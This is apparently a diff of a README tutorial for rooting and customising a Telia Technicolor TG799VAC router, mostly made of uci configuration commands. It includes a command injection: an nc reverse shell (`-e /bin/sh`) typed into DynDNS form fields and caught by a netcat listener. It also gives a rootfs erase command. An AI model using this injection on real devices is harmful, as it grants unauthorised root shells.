@@ -8,8 +8,11 @@
 
    I have not found any other tutorial how-to hack this version from technicolor in this way I have done it. Someone has to be the first on a new exploit and let everyone know what's really is an open door straight into your 
    network and your digital life. This is 
-   nothing people just should say things like "i do not care" cause this can really be abused if there is some blackhat hacker on the support or if someone just is curios about your life and has enough freetime . With TSHARK or WSHARK they can sniff ALL your traffic no matter what ppl say since the router is the last point in 'almost' all home-networks. I exposing Telia again cause i see this as a REAL threat to our privacy...I had never questioned this if the providers had been straight and honest about what they actually 
-   have access to. I will expose every setting, every ip and every key i can found until they will remove the backdoors. Now im bored so let's start i really hate to write descs and the faster you get this information, the faster you can protect yourself from the backdoors. 
+   nothing people just should say things like "i do not care" cause this can really be abused if there is some blackhat hacker on the support or if someone just is curios about your life and has enough freetime . With TSHARK or 
+WSHARK they can sniff ALL your traffic no matter what ppl say since the router is the last point in 'almost' all home-networks. I exposing Telia again cause i see this as a REAL threat to our privacy...I had never questioned this 
+if the providers had been straight and honest about what they actually 
+   have access to. I will expose every setting, every ip and every key i can found until they will remove the backdoors. Now im bored so let's start i really hate to write descs and the faster you get this information, the faster 
+you can protect yourself from the backdoors. 
 
 ##### FIRST SOME RLY SCARRY SHIT THAT USERS HAS NO KNOWLEDGE ABOUT AT ALL!! 
 
@@ -20,7 +23,8 @@ restore the router, what are they doing with this data? This is really unpleasan
 
 #### Do you look forward to upgrade your firmware without any third party software or without any backdoors from your internet provider? Great, i will show you how you will do this easier then ever..
 
-###### You have to add our admin user to upgradefw role and after this has been done you will get access. I have added a preview below the commands where to upload your new firmware (THIS IS DANGEROUS - DONT PLAY WITH THIS IF YOU HAVE NO KNOWLEDGE ABOUT HOW THIS WORKS IT WILL PROBABLY BRICK YOUR DEVICE WITH WRONG FIRMWARE, PERMANENT!):
+###### You have to add our admin user to upgradefw role and after this has been done you will get access. I have added a preview below the commands where to upload your new firmware (THIS IS DANGEROUS - DONT PLAY WITH THIS IF YOU 
+HAVE NO KNOWLEDGE ABOUT HOW THIS WORKS IT WILL PROBABLY BRICK YOUR DEVICE WITH WRONG FIRMWARE, PERMANENT!):
 
     uci add_list web.uidefault.upgradefw_role='admin'
     uci commit
@@ -29,7 +33,7 @@ restore the router, what are they doing with this data? This is really unpleasan
 
 ![Screenshot](files/wuseman.pwned.telia.png)
 
-     uci set web.usr_Administrator.role='superuser'
+    uci set web.usr_Administrator.role='superuser'
     
 ![Screenshot](files/upgrade_firmware.png)
 
@@ -41,7 +45,7 @@ restore the router, what are they doing with this data? This is really unpleasan
 
 ![Screenshot](files/erase-rootfs.gif)
 
-      mtd -r erase rootfs_data
+    mtd -r erase rootfs_data
 
 ##### When you gonna install custom packages from any arch there might be a little problem with term, this is how you will fix it:
 
@@ -49,17 +53,16 @@ restore the router, what are they doing with this data? This is really unpleasan
 
 ###### With below setting you will be allowed to install packages from more repos:
 
-     cat > /etc/opkg.conf
+    cat > /etc/opkg.conf
 
-      dest root /
-      dest ram /tmp
-      lists_dir ext /var/opkg-lists
-      option overlay_root /overlay
-      arch all 1
-      arch noarch 1
-      arch brcm63xx 3
-      arch brcm63xx-tch 10
-
+    dest root /
+    dest ram /tmp
+    lists_dir ext /var/opkg-lists
+    option overlay_root /overlay
+    arch all 1
+    arch noarch 1
+    arch brcm63xx 3
+    arch brcm63xx-tch 10
 
 ###### Run uci-whois.sh for whois all ip-adresses that has been added to configuration files from your internet provider: 
 
@@ -71,7 +74,8 @@ restore the router, what are they doing with this data? This is really unpleasan
 
     nc -lvvp [machine_port]
 
-##### Go to the WAN Services and press SHOW ADVANCED. In username, password and domain field you need type the below command, after this is done just enable the dyndns. It wont matter wich hoster you choose just pick one, press save and just wait 4-5 seconds and you have just got full root access of your TG799VAC Xtreme 17.2 Mint, check preview video above if you do not understand.
+##### Go to the WAN Services and press SHOW ADVANCED. In username, password and domain field you need type the below command, after this is done just enable the dyndns. It wont matter wich hoster you choose just pick one, press 
+save and just wait 4-5 seconds and you have just got full root access of your TG799VAC Xtreme 17.2 Mint, check preview video above if you do not understand.
 
     :::::::`nc [machine_IP] [machine_port] -e /bin/sh`
 
@@ -179,19 +183,19 @@ restore the router, what are they doing with this data? This is really unpleasan
 ##### Example 1 
     cat > /etc/config/ddns
     config service 'myddns_ipv4'
-        option interface 'wan'
-        option ip_source 'network'
-        option ip_network 'wan'
-        option use_https '1'
-        option cacert 'IGNORE'
-        option force_interval '36500'
-        option force_unit 'days'
-        option enabled '1'
-        option password 'password'
-        option username 'domain.com'
-        option service_name 'loopia.se'
-        option lookup_host 'domain.com'
-        option domain 'domain.com'
+    option interface 'wan'
+    option ip_source 'network'
+    option ip_network 'wan'
+    option use_https '1'
+    option cacert 'IGNORE'
+    option force_interval '36500'
+    option force_unit 'days'
+    option enabled '1'
+    option password 'password'
+    option username 'domain.com'
+    option service_name 'loopia.se'
+    option lookup_host 'domain.com'
+    option domain 'domain.com'
 
 
 ##### List product, serial, ssid prefix etc by below command:
@@ -202,7 +206,7 @@ restore the router, what are they doing with this data? This is really unpleasan
     PROD_NUMBER ===> Telia WiFi-router Plus v3
     PROD_FRIENDLY_NAME ===> Telia WiFi-router Plus v3
     VARIANT_FRIENDLY_NAME ===> TG799TSvac Xtream
-     SSID_SERIAL_PREFIX ===> TNCAP
+    SSID_SERIAL_PREFIX ===> TNCAP
     BOARD_NAME ===> VBNT-H
     BOARD_SERIAL_NBR ===> SECRET
     PROD_SERIAL_NBR ===> SECRET
@@ -219,16 +223,16 @@ restore the router, what are they doing with this data? This is really unpleasan
 
 ##### Setup local hostnames:
 
-     cat >> /etc/config/dhcp
-     config host
-        option name 'moms.ipad'
-        option mac 'macaddr'
-        option ip 'prefered.localip''
+    cat >> /etc/config/dhcp
+    config host
+    option name 'moms.ipad'
+    option mac 'macaddr'
+    option ip 'prefered.localip''
 
     config host
-        option name 'dads.linux.laptop'
-        option mac 'macaddr'
-        option ip 'prefered.localip'
+    option name 'dads.linux.laptop'
+    option mac 'macaddr'
+    option ip 'prefered.localip'
 
 ##### Some guys on openwrt forum claims that your webgui will be faster if you change some power settings (DO IT ON YOUR OWN RISK I HAVENT TRIED)
 
@@ -253,11 +257,11 @@ restore the router, what are they doing with this data? This is really unpleasan
     cp /rom/www/docroot/modals/l2tp-ipsec-server-modal.lp /www/docroot/modals/
     
     cat >> /etc/config/web
-       list rules 'l2tpipsecservermodal'
-       config rule 'l2tpipsecservermodal'
-       option target '/modals/l2tp-ipsec-server-modal.lp'
-       list roles 'admin'
-       list roles 'engineer'
+     list rules 'l2tpipsecservermodal'
+     config rule 'l2tpipsecservermodal'
+     option target '/modals/l2tp-ipsec-server-modal.lp'
+     list roles 'admin'
+     list roles 'engineer'
     
 ![Screenshot](files/vpn-in-webgui.png)
 
@@ -266,97 +270,97 @@ restore the router, what are they doing with this data? This is really unpleasan
 
 ##### Rules
 
-     uci add_list web.uidefault.upgradefw_role='admin'
-     uci set web.natalghelpermodal=rule
-     uci set web.relaymodal=rule
-     uci set web.systemmodal=rule
-     uci set web.iproutesmodal=rule
-     uci set web.mmpbxinoutgoingmapmodal=rule
-     uci set web.ltedoctor=rule
-     uci set web.ltemodal=rule
-     uci set web.lteprofiles=rule
-     uci set web.ltesim=rule
-     uci set web.ltesms=rule
-     uci set web.logconnections=rule
-     uci set web.logviewer=rule
-     uci set web.logviewer.roles=rule
-     uci set tod.global.enabled='1'
-     uci set mobiled.globals.enabled='1'
-     uci set mobiled.device_defaults.enabled='1'
-     uci commit; /etc/init.d/nginx restart
+    uci add_list web.uidefault.upgradefw_role='admin'
+    uci set web.natalghelpermodal=rule
+    uci set web.relaymodal=rule
+    uci set web.systemmodal=rule
+    uci set web.iproutesmodal=rule
+    uci set web.mmpbxinoutgoingmapmodal=rule
+    uci set web.ltedoctor=rule
+    uci set web.ltemodal=rule
+    uci set web.lteprofiles=rule
+    uci set web.ltesim=rule
+    uci set web.ltesms=rule
+    uci set web.logconnections=rule
+    uci set web.logviewer=rule
+    uci set web.logviewer.roles=rule
+    uci set tod.global.enabled='1'
+    uci set mobiled.globals.enabled='1'
+    uci set mobiled.device_defaults.enabled='1'
+    uci commit; /etc/init.d/nginx restart
 
 ##### Ruleset
 
-     uci add_list web.ruleset_main.rules=xdsllowmodal
-     uci add_list web.ruleset_main.rules=systemmodal
-     uci add_list web.ruleset_main.rules=natalghelpermodal
-     uci add_list web.ruleset_main.rules=diagnostics
-     uci add_list web.ruleset_main.rules=basicviewaccesscodemodal
-     uci add_list web.ruleset_main.rules=basicviewwifiguestmodal
-     uci add_list web.ruleset_main.rules=basicviewwifiguest5GHzmodal
-     uci add_list web.ruleset_main.rules=basicviewwifipskmodal
-     uci add_list web.ruleset_main.rules=basicviewwifipsk5GHzmodal
-     uci add_list web.ruleset_main.rules=basicviewwifissidmodal
-     uci add_list web.ruleset_main.rules=basicviewwifissid5GHzmodal
-     uci add_list web.ruleset_main.rules=relaymodal
-     uci add_list web.ruleset_main.rules=iproutesmodal
-     uci add_list web.ruleset_main.rules=mmpbxinoutgoingmapmodal
-     uci add_list web.ruleset_main.rules=mmpbxstatisticsmodal
-     uci commit; /etc/init.d/nginx restart
+    uci add_list web.ruleset_main.rules=xdsllowmodal
+    uci add_list web.ruleset_main.rules=systemmodal
+    uci add_list web.ruleset_main.rules=natalghelpermodal
+    uci add_list web.ruleset_main.rules=diagnostics
+    uci add_list web.ruleset_main.rules=basicviewaccesscodemodal
+    uci add_list web.ruleset_main.rules=basicviewwifiguestmodal
+    uci add_list web.ruleset_main.rules=basicviewwifiguest5GHzmodal
+    uci add_list web.ruleset_main.rules=basicviewwifipskmodal
+    uci add_list web.ruleset_main.rules=basicviewwifipsk5GHzmodal
+    uci add_list web.ruleset_main.rules=basicviewwifissidmodal
+    uci add_list web.ruleset_main.rules=basicviewwifissid5GHzmodal
+    uci add_list web.ruleset_main.rules=relaymodal
+    uci add_list web.ruleset_main.rules=iproutesmodal
+    uci add_list web.ruleset_main.rules=mmpbxinoutgoingmapmodal
+    uci add_list web.ruleset_main.rules=mmpbxstatisticsmodal
+    uci commit; /etc/init.d/nginx restart
 
 ##### Target ( You will get even more stuff in webinterface after you run below commands )
 
-     uci set web.mmpbxinoutgoingmapmodal.target='/modals/mmpbx-inoutgoingmap-modal.lp'
-     uci set web.iproutesmodal.target='/modals/iproutes-modal.lp'
-     uci set web.systemmodal.target='/modals/system-modal.lp'
-     uci  set web.relaymodal.target='/modals/relay-modal.lp'
-     uci set web.natalghelpermodal.target='/modals/nat-alg-helper-modal.lp'
-     uci set web.diagnosticstcpdumpmodal.target='/modals/diagnostics-tcpdump-modal.lp'
-     uci set web.natalghelpermodal.target='/modals/basicview-accesscode-modal.lp'
-     uci set web.natalghelpermodal.target='/modals/basicview-wifiguest-modal.lp'
-     uci set web.natalghelpermodal.target='/modals/basicview-wifiguest5GHz-modal.lp'
-     uci set web.natalghelpermodal.target='/modals/basicview-wifipsk-modal.lp'
-     uci set web.natalghelpermodal.target='/modals/basicview-wifipsk5GHz-modal.lp'
-     uci set web.natalghelpermodal.target='/modals/basicview-wifissid-modal.lp'
-     uci set web.natalghelpermodal.target='/modals/basicview-wifissid5GHz-modal.lp'
-     uci set web.ltemodal.target='/modals/lte-modal.lp'
-     uci set web.ltedoctor.target='/modals/lte-doctor.lp'
-     uci set web.lteprofiles.target='/modals/lte-profiles.lp'
-     uci set web.logconnections.target='/modals/log-connections-modal.lp'
-     uci set web.logviewer.target='/modals/logviewer-modal.lp'
-     uci set web.ltesms.target='/modals/lte-sms.lp'
-     uci set web.ltesim.target='/modals/lte-sim.lp'
-     uci set web.xdsllowmodal.target='/modals/xdsl-low-modal.lp'
-     uci commit; /etc/init.d/nginx restart
+    uci set web.mmpbxinoutgoingmapmodal.target='/modals/mmpbx-inoutgoingmap-modal.lp'
+    uci set web.iproutesmodal.target='/modals/iproutes-modal.lp'
+    uci set web.systemmodal.target='/modals/system-modal.lp'
+    uci  set web.relaymodal.target='/modals/relay-modal.lp'
+    uci set web.natalghelpermodal.target='/modals/nat-alg-helper-modal.lp'
+    uci set web.diagnosticstcpdumpmodal.target='/modals/diagnostics-tcpdump-modal.lp'
+    uci set web.natalghelpermodal.target='/modals/basicview-accesscode-modal.lp'
+    uci set web.natalghelpermodal.target='/modals/basicview-wifiguest-modal.lp'
+    uci set web.natalghelpermodal.target='/modals/basicview-wifiguest5GHz-modal.lp'
+    uci set web.natalghelpermodal.target='/modals/basicview-wifipsk-modal.lp'
+    uci set web.natalghelpermodal.target='/modals/basicview-wifipsk5GHz-modal.lp'
+    uci set web.natalghelpermodal.target='/modals/basicview-wifissid-modal.lp'
+    uci set web.natalghelpermodal.target='/modals/basicview-wifissid5GHz-modal.lp'
+    uci set web.ltemodal.target='/modals/lte-modal.lp'
+    uci set web.ltedoctor.target='/modals/lte-doctor.lp'
+    uci set web.lteprofiles.target='/modals/lte-profiles.lp'
+    uci set web.logconnections.target='/modals/log-connections-modal.lp'
+    uci set web.logviewer.target='/modals/logviewer-modal.lp'
+    uci set web.ltesms.target='/modals/lte-sms.lp'
+    uci set web.ltesim.target='/modals/lte-sim.lp'
+    uci set web.xdsllowmodal.target='/modals/xdsl-low-modal.lp'
+    uci commit; /etc/init.d/nginx restart
 
 ##### Roles ( You will see new stuff on webinterface after you run below commands)
 
-     uci add_list web.assistancemodal.roles='admin' 
-     uci add_list web.usermgrmodal.roles='admin'
-     uci add_list web.cwmpconf.roles='admin'
-     uci add_list web.todmodal.roles='admin'
-     uci add_list web.iproutesmodal.roles='admin'
-     uci add_list web.natalghelper.roles='admin'
-     uci add_list web.mmpbxglobalmodal.roles='admin' 
-     uci add_list web.mmpbxprofilemodal.roles='admin' 
-     uci add_list web.parentalblock.roles=admin
-     uci add_list web.mmpbxinoutgoingmapmodal.roles='admin'
-     uci add_list web.systemmodal.roles='admin'
-     uci add_list web.relaymodal.roles='admin'
-     uci add_list web.natalghelpermodal.roles='admin'
-     uci add_list web.diagnosticstcpdumpmodal.roles='admin'
-     uci add_list web.ltedoctor.roles="admin"
-     uci add_list web.ltemodal.roles="admin"
-     uci add_list web.lteprofiles.roles="admin"
-     uci add_list web.xdsllowmodal.roles='admin'
-     uci add_list web.ltesim.roles="admin"
-     uci add_list web.logconnections.roles="admin"
-     uci add_list web.logviewer.roles="admin"
-     uci add_list web.logconnections.roles="admin"
-     uci add_list web.home.roles='admin'
-     uci add_list web.ltesms.roles='admin'
-     uci add_list web.logviewer.roles="admin"
-     commit; /etc/init.d/nginx restart
+    uci add_list web.assistancemodal.roles='admin' 
+    uci add_list web.usermgrmodal.roles='admin'
+    uci add_list web.cwmpconf.roles='admin'
+    uci add_list web.todmodal.roles='admin'
+    uci add_list web.iproutesmodal.roles='admin'
+    uci add_list web.natalghelper.roles='admin'
+    uci add_list web.mmpbxglobalmodal.roles='admin' 
+    uci add_list web.mmpbxprofilemodal.roles='admin' 
+    uci add_list web.parentalblock.roles=admin
+    uci add_list web.mmpbxinoutgoingmapmodal.roles='admin'
+    uci add_list web.systemmodal.roles='admin'
+    uci add_list web.relaymodal.roles='admin'
+    uci add_list web.natalghelpermodal.roles='admin'
+    uci add_list web.diagnosticstcpdumpmodal.roles='admin'
+    uci add_list web.ltedoctor.roles="admin"
+    uci add_list web.ltemodal.roles="admin"
+    uci add_list web.lteprofiles.roles="admin"
+    uci add_list web.xdsllowmodal.roles='admin'
+    uci add_list web.ltesim.roles="admin"
+    uci add_list web.logconnections.roles="admin"
+    uci add_list web.logviewer.roles="admin"
+    uci add_list web.logconnections.roles="admin"
+    uci add_list web.home.roles='admin'
+    uci add_list web.ltesms.roles='admin'
+    uci add_list web.logviewer.roles="admin"
+    commit; /etc/init.d/nginx restart
 
 ##### All kind of stuff for webgui (Nothing special, edit them after your needs)
 
@@ -396,8 +400,8 @@ restore the router, what are they doing with this data? This is really unpleasan
 
     cat >> /etc/config/dhcp
     config domain
-        option name 'github'
-        option ip '192.30.253.112'
+    option name 'github'
+    option ip '192.30.253.112'
 
 ###### Example 2 - uci method 
  
@@ -483,32 +487,32 @@ restore the router, what are they doing with this data? This is really unpleasan
 ###### A minimal alias definition for a bridged interface might be:
 
     config interface lan
-        option 'ifname' 'eth0'
-        option 'type' 'bridge'
-        option 'proto' 'static'
-        option 'ipaddr' '192.168.1.1'
-        option 'netmask' '255.255.255.0'
+    option 'ifname' 'eth0'
+    option 'type' 'bridge'
+    option 'proto' 'static'
+    option 'ipaddr' '192.168.1.1'
+    option 'netmask' '255.255.255.0'
 
     config interface lan2
-       option 'ifname' 'br-lan'
-       option 'proto' 'static'
-       option 'ipaddr' '10.0.0.1'
-       option 'netmask' '255.255.255.0'
+     option 'ifname' 'br-lan'
+     option 'proto' 'static'
+     option 'ipaddr' '10.0.0.1'
+     option 'netmask' '255.255.255.0'
 
 ####### For for a non-bridge interface
 
     config interface lan
-        option 'ifname' 'eth0'
-        option 'proto' 'static'
-        option 'ipaddr' '192.168.1.1'
-        option 'netmask' '255.255.255.0'
+    option 'ifname' 'eth0'
+    option 'proto' 'static'
+    option 'ipaddr' '192.168.1.1'
+    option 'netmask' '255.255.255.0'
 
     config interface lan2
-       option 'ifname' 'eth0'
-       option 'proto' 'static'
-       option 'ipaddr' '10.0.0.1'
-       option 'netmask' '255.255.255.0'
-       
+     option 'ifname' 'eth0'
+     option 'proto' 'static'
+     option 'ipaddr' '10.0.0.1'
+     option 'netmask' '255.255.255.0'
+     
 ##### Use your tg799 router as a switch
 
 ###### Here is my example for using all ports for local network and also wan port(5): 
@@ -516,33 +520,33 @@ restore the router, what are they doing with this data? This is really unpleasan
  cat > /etc/config/network
 
     config 'switch' 'eth0'
-       	option 'enable' '1'
+     	option 'enable' '1'
 
     config 'switch_vlan' 'eth0_0'
-       option 'device' 'eth0'
-       option 'vlan' '0'
-       option 'ports' '4 5' #wan
+     option 'device' 'eth0'
+     option 'vlan' '0'
+     option 'ports' '4 5' #wan
 
-     config 'switch_vlan' 'eth0_1'
-       option 'device' 'eth0'
-       option 'vlan' '1'
-       option 'ports' '3 5' #lan 1
+    config 'switch_vlan' 'eth0_1'
+     option 'device' 'eth0'
+     option 'vlan' '1'
+     option 'ports' '3 5' #lan 1
 
     config 'switch_vlan' 'eth0_2'
-       option 'device' 'eth0'
-       option 'vlan' '2'
-       option 'ports' '2 5' #lan2
+     option 'device' 'eth0'
+     option 'vlan' '2'
+     option 'ports' '2 5' #lan2
 
     config 'switch_vlan' 'eth0_3'
-       option 'device' 'eth0'
-       option 'vlan' '3'
-       option 'ports' '1 5' #lan3
+     option 'device' 'eth0'
+     option 'vlan' '3'
+     option 'ports' '1 5' #lan3
 
     config 'switch_vlan' 'eth0_4'
-       option 'device' 'eth0'
-       option 'vlan' '4'
-       option 'ports' '0 5' #lan4
-     
+     option 'device' 'eth0'
+     option 'vlan' '4'
+     option 'ports' '0 5' #lan4
+    
 
 ##### Wanna have some fun? Edit all false to true and vice versa ;p 
 ###### DO THIS ON YOUR OWN RISK ( YOU HAVE BEEN WARNED )
@@ -616,7 +620,7 @@ restore the router, what are they doing with this data? This is really unpleasan
 ##### Enable/Disable network time server
 
     uci set system.ntp.enable_server='1'
-     
+    
 ##### Using bridge mode with a dedicated PPPoE ethernet port:
   
     uci set network.lan.dns='1.1.1.1'
@@ -640,73 +644,131 @@ restore the router, what are they doing with this data? This is really unpleasan
 ##### This will show all ip numbers connected to your router atm..
 
     netstat -lantp | grep ESTABLISHED |awk '{print $5}' | awk -F: '{print $1}' | sort -u  
-     
+    
 ##### Capture traffic on all interfaces (add -i wl0 for include wifi):
 
     tcpdump -vvv -ttt -p -U
     tcpdump -i wl0 -vvv -ttt -p -U
-     
+    
 ##### Enable or Disable WWAN support (mobiled)
 
-     uci set mobiled.globals.enabled='0'
-     uci set mobiled.device_defaults.enabled='0'
-     
+    uci set mobiled.globals.enabled='0'
+    uci set mobiled.device_defaults.enabled='0'
+    
 ##### Enable or Disable Content Sharing (Samba / DNLA)
 
-     uci set samba.samba.enabled='1'
-     uci set dlnad.config.enabled='1'
+    uci set samba.samba.enabled='1'
+    uci set dlnad.config.enabled='1'
 
 ##### Remove all mobiled stuff (just copy and paste):
 
     echo -e "
-     #!/bin/ash
-     # Loop
-     state=$(uci show | grep -e 'mobiled.\@mobiled' | cut -d= -f1); for i in $mstate; do uci delete $i; done
-     for msettings in $(uci show|grep -Eo 'mobiled.@.*'|cut -d. -f1,2|cut -d= -f1 &> /dev/null); do uci delete $msettings;        done
-     
-     # 1by1
-     uci delete mobiled.device_defaults &> /dev/null
-     uci delete mobiled.platform &> /dev/null
-     uci delete mobiled.globals &> /dev/null
-     uci set network.wwan.proto=''
-     uci delete web.lteajaxmobiletab &> /dev/null
-     uci delete web_back.lteajaxmobiletab &> /dev/null
-     uci del_list web.ruleset_main.rules='mobiled'
-     uci delete web.lteajaxmobiletab.roles &> /dev/null
-     uci set ledfw.status_led.mobile_itf=''
-     uci delete web_back.ruleset_main.rules='ltesim'
-     uci delete web_back.ruleset_main.rules='lteajaxsim'
-     uci delete web_back.ruleset_main.rules='lteajaxmobiletab'
-     uci delete web_back.ruleset_main.rules='lteradioparameters'
-     uci delete web_back.ruleset_main.rules='lteprofiles'
-     uci delete web_back.ruleset_main.rules='ltesms'
-     uci delete web_back.ruleset_main.rules='ltedoctormodal'
-     uci delete web_back.ruleset_main.rules='ltemodal'
-     uci delete web.ruleset_main.rules='ltemodal'
-     uci delete web.ruleset_main.rules='ltemodal'
-     uci delete web.ruleset_main.rules='ltedoctormodal'
-     uci delete web.ruleset_main.rules='ltesms'
-     uci delete web.ruleset_main.rules='lteprofiles'
-     uci delete web.ruleset_main.rules='lteradioparameters'
-     uci delete web.ruleset_main.rules='lteajaxsms'
-     uci delete web.ruleset_main.rules='lteajaxmobiletab'
-     uci delete web.ruleset_main.rules='ltenetworkscan'
-     uci delete web.ruleset_main.rules='lteajaxsim'
-     uci delete web.ruleset_main.rules='ltesim'
-     uci delete web.ruleset_main.rules='ltedoctorajax'
-     echo All mobiled settings has been removed.. " > /tmp/remove.mobileshit
-     sed -i 's/^     //g' /tmp/remove.mobileshit;chmod +x /tmp/remove.mobileshit; sh /tmp/remove.mobileshit; rm /tmp/remove.mobileshit
+    #!/bin/ash
+    # Loop
+    state=$(uci show | grep -e 'mobiled.\@mobiled' | cut -d= -f1); for i in $mstate; do uci delete $i; done
+    for msettings in $(uci show|grep -Eo 'mobiled.@.*'|cut -d. -f1,2|cut -d= -f1 &> /dev/null); do uci delete $msettings;    done
     
-##### Add a new role user: 
+    # 1by1
+    uci delete mobiled.device_defaults &> /dev/null
+    uci delete mobiled.platform &> /dev/null
+    uci delete mobiled.globals &> /dev/null
+    uci set network.wwan.proto=''
+    uci delete web.lteajaxmobiletab &> /dev/null
+    uci delete web_back.lteajaxmobiletab &> /dev/null
+    uci del_list web.ruleset_main.rules='mobiled'
+    uci delete web.lteajaxmobiletab.roles &> /dev/null
+    uci set ledfw.status_led.mobile_itf=''
+    uci delete web_back.ruleset_main.rules='ltesim'
+    uci delete web_back.ruleset_main.rules='lteajaxsim'
+    uci delete web_back.ruleset_main.rules='lteajaxmobiletab'
+    uci delete web_back.ruleset_main.rules='lteradioparameters'
+    uci delete web_back.ruleset_main.rules='lteprofiles'
+    uci delete web_back.ruleset_main.rules='ltesms'
+    uci delete web_back.ruleset_main.rules='ltedoctormodal'
+    uci delete web_back.ruleset_main.rules='ltemodal'
+    uci delete web.ruleset_main.rules='ltemodal'
+    uci delete web.ruleset_main.rules='ltemodal'
+    uci delete web.ruleset_main.rules='ltedoctormodal'
+    uci delete web.ruleset_main.rules='ltesms'
+    uci delete web.ruleset_main.rules='lteprofiles'
+    uci delete web.ruleset_main.rules='lteradioparameters'
+    uci delete web.ruleset_main.rules='lteajaxsms'
+    uci delete web.ruleset_main.rules='lteajaxmobiletab'
+    uci delete web.ruleset_main.rules='ltenetworkscan'
+    uci delete web.ruleset_main.rules='lteajaxsim'
+    uci delete web.ruleset_main.rules='ltesim'
+    uci delete web.ruleset_main.rules='ltedoctorajax'
+    uci delete web_back.ltemodal &> /dev/null
+    uci delete web_back.ltedoctormodal &> /dev/null
+    uci delete web_back.ltesms &> /dev/null
+    uci delete web_back.lteprofiles &> /dev/null
+    uci delete web_back.lteradioparameters &> /dev/null
+    uci delete web_back.lteajaxsms &> /dev/null
+    uci delete web_back.ltenetworkscan &> /dev/null
+    uci delete web_back.lteajaxsim &> /dev/null
+    uci delete web_back.ltesim &> /dev/null
+    ici delete web.ltemodal &> /dev/null
+    uci delete web.ltedoctormodal &> /dev/null
+    uci delete web.ltesms &> /dev/null
+    uci delete web.lteprofiles &> /dev/null
+    uci delete web.lteradioparameters &> /dev/null
+    uci delete web.lteajaxsms &> /dev/null
+    uci delete web.ltenetworkscan &> /dev/null
+    uci delete web.lteajaxsim &> /dev/null
+    uci delete web.ltesim &> /dev/null
+    uci delete web.ltemodal
+    uci delete web.ltemod
+    uci delete web.lteajaxsim.target &> /dev/null
+    uci del_list web_back.ruleset_main.rules='ltedoctor' 
+    uci del_list web_back.ruleset_main.rules='ltedoctorajax'
+    uci del_list web_back.ruleset_main.rules='ltenetworkscan'
+    uci del_list web_back.ruleset_main.rules='lteajaxsms'
+    uci del_list web_back.ruleset_main.rules='ltedoctor'
+    rm /www/docroot/ajax/sms.lua
+    rm /www/docroot/ajax/sim.lua
+    rm /www/docroot/ajax/mobiletab.lua
+    rm /www/docroot/ajax/lte-doctor.lua   
+    echo All mobile shit has been removed.. " > /tmp/remove.mobileshit
+    sed -i 's/^    //g' /tmp/remove.mobileshit;chmod +x /tmp/remove.mobileshit; sh /tmp/remove.mobileshit; rm /tmp/remove.mobileshit
+    
+##### Add a new role: 
 
     clash newsrpuser -u <wuseman> -p <password>
-    uci set web_back.usr_wuseman.srp_salt='48A78BA7'
-    uci set web_back.usr_Administrator.srp_verifier='8FD2D40F22A182076744394FAC09FBE376AECEFB206BF89E2CC56850D56B0ED6B240A0F6331CD71EBFF595515141230B06B77EB6299224D85C71BEEAD9D2B08A00B12395A15A9CE0F0F9025FC5D180EB54124547FA0AECE1C7EDD689250B7E9E0466471CBE3E86DD560E9849C4987ED981257F56A51F023BE9CC7DC82BF2D83649934604411B933D4240975ADFD7E1E818F09F773F0DB6FADBD5AC8DF49867B76F8B6754F83EB9EE0964DD79EE4CB93FF0A6A678D7A402E2DEC11B5D54F27937E8B590D70F6A070D489C10F19F40BEDFE6F40D5090BAF9718F9741EB2A97AFAB4EC9038EF04214C980156397B61AABCF00E1B985EAD4F8D957871E9ED4A5555C'
+    uci set web_back.usr_wuseman.srp_salt='000000007'
+    uci add web_back.default.users='usr_wuseman'
+    uci add web_back.uidefault.defaultuser='wuseman'
+    uci add web_back.usr_wuseman=user
+    uci set web_back.usr_wuseman.name='wuseman'
+    uci set web_back.usr_wuseman.role='wuseman'
+    uci set web_back.usr_wuseman.gak_id='1'
+
+    echo "
+    config user 'usr_wuseman'
+    option name 'wuseman'
+    option password_reminder '0'
+    option srp_verifier '<HASH HERE>'
+    option srp_salt '000000007'
+    " >> /etc/config/web
+
 
 ##### Delete all telia internal rules:
 
     uci delete mwan.teliainternal1
     uci delete mwan.teliainternal2
+    uci delete telia.config
+    uci delete telia.com_ts_boot
+    uci delete telia.com_ts_core_util
+    uci delete telia.com_ts_core_logging
+    uci delete telia.com_ts_core_datamodel
+    uci delete telia.com_ts_core_auth
+    uci delete telia.com_ts_core_appinstall
+    uci delete telia.com_ts_core_uci_listener
+    uci delete telia.com_ts_core_coreapp
+    uci delete telia.com_ts_core_reporter
+    uci delete telia.com_ts_core_bootupgrader
+    uci delete telia.com_ts_core_osgienvfix
+    uci delete telia.telia_zone    
+    uci delete telia.telia_wifiinfo
     
 ##### Take control over mwan:
 
@@ -716,34 +778,34 @@ restore the router, what are they doing with this data? This is really unpleasan
 
 ##### To view currently dhcp leases:
 
-     cat /tmp/dhcp.leases
-     1534969000 macaddr lanip machine macaddr
+    cat /tmp/dhcp.leases
+    1534969000 macaddr lanip machine macaddr
 
 ##### To view all ipv4 adresses from uci settings:
 
-     uci show | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
+    uci show | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
 
 ##### CPU info:
 
-     clash showinfo cpu
-     
-    Processor       : ARMv7 Processor rev 1 (v7l)
-    processor       : 0
-    BogoMIPS        : 1990.65
+    clash showinfo cpu
+    
+    Processor     : ARMv7 Processor rev 1 (v7l)
+    processor     : 0
+    BogoMIPS    : 1990.65
 
-    processor       : 1
-    BogoMIPS        : 1990.65
+    processor     : 1
+    BogoMIPS    : 1990.65
  
-    Features        : swp half thumb fastmult edsp tls 
+    Features    : swp half thumb fastmult edsp tls 
     CPU implementer : 0x41 
     CPU architecture: 7
-    CPU variant     : 0x4
-    CPU part        : 0xc09
+    CPU variant    : 0x4
+    CPU part    : 0xc09
     CPU revision    : 1
 
-    Hardware        : BCM963138
-    Revision        : 0000
-    Serial          : 0000000000000000
+    Hardware    : BCM963138
+    Revision    : 0000
+    Serial     : 0000000000000000
 
 ##### Example on how-to add a new new modal:
 
@@ -755,86 +817,86 @@ restore the router, what are they doing with this data? This is really unpleasan
 
 ##### Enable/Disable web gui:
 
-     uci set web.remote.active='1'
+    uci set web.remote.active='1'
 
 ##### List arp.log
  
-     cat /tmp/arp.log
-     IP address       HW type     Flags       HW address            Mask     Device
-     lanip            0x1         0x2         X0:X0:X0:X0:X0:X0      *        br-lan
-     mgmt_ip          0x1         0x2         X0:X0:X0:X0:X0:X0     *        vlan_mgmt
-     wanip            0x1         0x2         X0:X0:X0:X0:X0:X0     *        eth4
-     
+    cat /tmp/arp.log
